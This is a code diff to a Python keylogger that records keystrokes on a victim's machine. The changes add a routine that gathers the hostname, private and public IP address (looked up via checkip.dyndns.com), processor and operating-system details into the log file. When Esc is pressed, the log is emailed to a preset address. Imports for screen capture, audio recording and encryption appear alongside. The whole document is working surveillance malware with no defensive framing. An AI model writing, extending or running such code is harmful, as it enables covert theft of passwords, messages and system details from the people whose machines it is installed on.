@@ -19,13 +19,13 @@ import sounddevice as sd
 
 from cryptography.fernet import Fernet
 
-import getpass
-from requests import get
-
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 from dotenv import load_dotenv
+
+from urllib.request import urlopen
+import re as r
 
 script_directory = os.path.dirname(os.path.abspath(__file__))
 log_file_path = os.path.join(script_directory, "log.txt")
@@ -109,14 +109,37 @@ def write_log():
 	keystroke_count = 0
 	line_count = 0
 
+def getIP():
+    d = str(urlopen('http://checkip.dyndns.com/').read())
+
+    return r.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(d).group(1)
+
+def write_system_info():
+	with open(log_file_path,"a") as out:
+		hostname = socket.gethostname()
+		IP_addr = socket.gethostbyname(hostname)
+		print(IP_addr, type(IP_addr))
+		out.write("Hostname -> " + hostname + 
+		"\nPrivate IP Address -> " + IP_addr + "\n")
+		try:
+			out.write("Public IP Address -> " + getIP() + "\n")
+		except Exception:
+			out.write("Failed to obtain public IP address" + "\n")
+		out.write("Processor -> " + platform.processor() 
+		+ "\nSystem -> " + platform.system() + ":" + platform.version()
+		+ "\nMachine -> " + platform.machine()	
+		)
+
 def on_release(key):
 	# break loop on pressing esc
 	if key == Key.esc :
 		write_log()
+		write_system_info()
 		send_email("log.txt", log_file_path, toAddress)
 		return False
 		
 
 # what to do when a key is pressed and released respectively
 with Listener(on_press = on_press, on_release = on_release) as listener:
+	print("Keylogger Started...")
 	listener.join()
